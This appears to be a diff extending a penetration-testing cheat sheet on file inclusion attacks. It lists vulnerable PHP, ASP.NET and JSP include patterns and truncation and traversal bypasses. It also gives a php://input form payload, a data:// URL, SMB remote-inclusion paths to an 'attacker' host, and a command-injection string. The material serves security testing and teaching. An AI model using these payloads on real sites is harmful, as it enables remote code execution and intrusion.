@@ -51,25 +51,64 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 
 > **File Inclusion**
 
+**Discovery**
+
+* Find Limitations: Is there code execution or are you seeing the source code? Are you able to read files outside of webroot? 
+* Determine if RFI is possible using Loopback (e.g., http://blog.site.org/blog.php?page=http://127.0.0.1/blog.php).  
+* If RFI is possible using loopback only try SMB/CIFS/nonstandard port or for PHP data:// or php:// (see below).
+
 **Common Examples in Different Languages**
 
 {% highlight php %}
 //PHP
+//Dynamic code execution
 require() 
 include()
 <?PHP include ( $_GET["page"] ); ?>
 //blog.php?page=blog1
+
+//Defenses: Prepending
+<?php include ( 'posts/' . $_GET["page"] ); ?>
+//a series of "../" can be prepeneded as a directory traversal
+
+//Defenses: Appending
+<?php included( $_GET["page"] . '.html'); ?>
+//Old PHP %00 will ingore everything after the null
+//New PHP a "?" is possibly similar to "%00"  and will ignore everything  after the question mark (query parameters)
+
+//Defense: Using Data - Sends raw data using the URL 
+(e.g., http://blog.site.org/blog.php?page=data://text/plain;base64,SSBsb3ZlIFBIUCE=)
+                                                                                                   
+//Defense: Using Input - traeats POST data as a file.  Create php_input_exploit.html, open it with firefox and submit the form
+<form action="http://blog.site.org/fileview.php?loc=php://input" method="post" enctype="text/plain">
+<input type="text" name="exploit" value="<?php phpinfo(); ?>" />
 {% endhighlight %}
 
 {% highlight C# %}
 //ASP(.net)
+//Dynamic with no code execution
 Response.WriteFile()
+
+//Dynamic code execution with web root access only.
 Server.Execute()
+
+//Defenses: Appending:
+// ASP a "?" is possibly similar to "%00"  and will ignore everything after the question mark (query parameters)
+
+//RFI .net on windowsusing SMB/CIFS
+\\attacker\mal\malicious.txt
 {% endhighlight %}
 
 {% highlight java %}
 //JSP
+//Dynamic code execution with web root access only.
 <jsp:include page="" />
+
+//Defenses: Appending
+//JSP a "?" is similar to "%00"  and will ignore everything after the question mark (query parameters)
+
+//RFI java on windowsusing SMB/CIFS
+\\attacker\mal\malicious.txt
 {% endhighlight %}
 
 **Linux Test Strings:**
